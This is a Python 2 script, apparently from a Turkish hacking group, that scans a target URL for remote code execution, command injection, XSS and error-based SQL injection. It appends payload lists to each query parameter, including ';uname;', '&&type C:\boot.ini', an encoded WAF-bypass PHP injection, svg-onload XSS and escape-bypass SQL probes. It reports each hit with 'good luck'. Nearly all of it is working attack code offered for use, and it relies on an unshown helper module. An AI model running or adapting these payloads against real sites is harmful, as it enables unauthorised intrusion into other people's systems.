#!/usr/bin/env python
# -*- coding: utf-8 -*-
#~> TG:@RoweenTheGod
#~> :v RoweenTheFucker
import urllib
import re
from serewi import *

def main_function(url, payloads, check):
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                print ga.red +" [~] WAF BULUNDU!"+ga.end
                print ga.red +" [~] 3 . 2 . 1 "+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            #sp = params.split("=")[0]
            for payload in payloads:
                #Hatalar = url.replace(sp, str(payload).strip())
                bugs = url.replace(params, params + str(payload).strip())
		#print Hata
		#exit()
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red +"\n [DiqqaT] "+ ga.end + ga.bold+ "Hedef Sistemde Güvenlik Açığı Bulundu"+ga.end
                        print ga.red+" ~> Payload: " ,payload +ga.end
                        print ga.bold+" ~> Alınan Hata: " +ga.end + line.strip()
                        print ga.blue+" ~> URL "+ga.end + bugs
                        print ga.green+" ~> BOL ŞANS :D "+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" ~> HEDEFTE GÜVENLİK AcıGINA RASTLANMADI"+ga.end
        else:
        	print ga.red+" %i Guvenlik açığı bulundu :) " % (vuln) +ga.end
def rce_func(url):
	headers_reader(url)
  	print ga.red +"\n [TARANIYOR] "+ ga.end + ga.bold+ "RCI & Remote Code Execution & Command Execution"+ga.end
  	print ga.red +"\n [TARANIYOR] "+ ga.end + ga.blue+ "SISTEM / WIN / LINUX DEBIAN"+ga.end
  	print ga.yellow+" Bekleyin . . . ."+ga.end
  	# RCI Payloads
  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
  	# Inj icin waff bypass payload
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
  	# RCE Payloads
  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
  	#re.I = "payload" ve "PAYLOAD".
  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main_function(url, payloads, check)

def xss_func(url):
        print ga.bold+"\n [TARANIYOR] "+ ga.end + ga.bold+ "XSS"+ga.end
        print ga.yellow+" Bekleyin . . . ."+ga.end
        #Payload zigoo="css();" XSS & <a href TAG.
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        check = re.compile('zigoo0<svg|x>x', re.I)
        main_function(url, payloads, check)

def error_based_sqli_func(url):
	print ga.red+"\n [TARANIYOR] "+ ga.end + ga.bold+ "SQL INJECTION"+ga.end
	print ga.red+"\n [VERITABANLARI DENETLENIYOR] "+ ga.end + ga.blue+ "PostGreSQL, PostGreSQL, MySQL MSACCESS & MSSQL, Oracle"+ga.end
	print ga.yellow+" Bekleyin . . . ."+ga.end
	# Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'
	#SQLi payload - bypass mysql_real_escape_*
	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile("Bilinmeyen Hata|Incorrect syntax|Databaseye baglanılamıyor|Databasede hata olustu|Syntax error|Hata olustu|An error occured|Error MySQL Database|SQL hatası|You have an error|in your syntax|Bilinmeyen karakter|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	main_function(url, payloads, check)
